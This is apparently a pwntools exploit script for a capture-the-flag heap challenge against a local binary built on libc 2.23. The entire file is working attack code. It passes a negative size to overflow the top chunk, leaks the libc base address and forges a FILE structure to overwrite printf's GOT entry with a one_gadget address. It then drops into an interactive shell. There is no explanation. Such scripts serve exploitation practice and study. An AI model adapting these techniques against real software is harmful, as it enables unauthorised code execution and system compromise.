from pwn import *
libc = ELF('./libc-2.23.so')
p = process("./pwn")
#p = remote()
context(arch='amd64', os='linux')

r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def menu(idx):
    sla(b'chioce:', str(idx).encode())

def add(idx, size, content):
    menu(1)
    sla(b':\n', str(idx).encode())
    sla(b':\n', str(size).encode())
    sa(b':\n', content)

def edit(idx, size, content):
    menu(2)
    sla(b':\n', str(idx).encode())
    sla(b':\n', str(size).encode())
    sa(b':\n', content)

def show(idx):
    menu(3)
    sla(b':\n', str(idx).encode())

gdb.attach(p, '''
    b *0x400a69
''')

add(1, 0x2f0, b'aaaa')
edit(1, -1, b'\x00' * 0x2f8 + p64(0xd01))

add(2, 0x1000, b'aaaa')
add(3, 0x2f0, b'\n')
show(3)

libc.address = u64(ru(b'\x7f').ljust(8, b'\x00')) - 0x3c510a
pr('libc_base', libc.address)
io_list_all = libc.sym['_IO_list_all']

one = libc.address + 0xf03a4
pr('one', one)
printf_got = 0x602030
payload = p64(0xfbad208b) + p64(0) * 6 + p64(printf_got) + p64(printf_got + 8)

edit(-22, 0x90, payload)

s(p64(one))

shell()
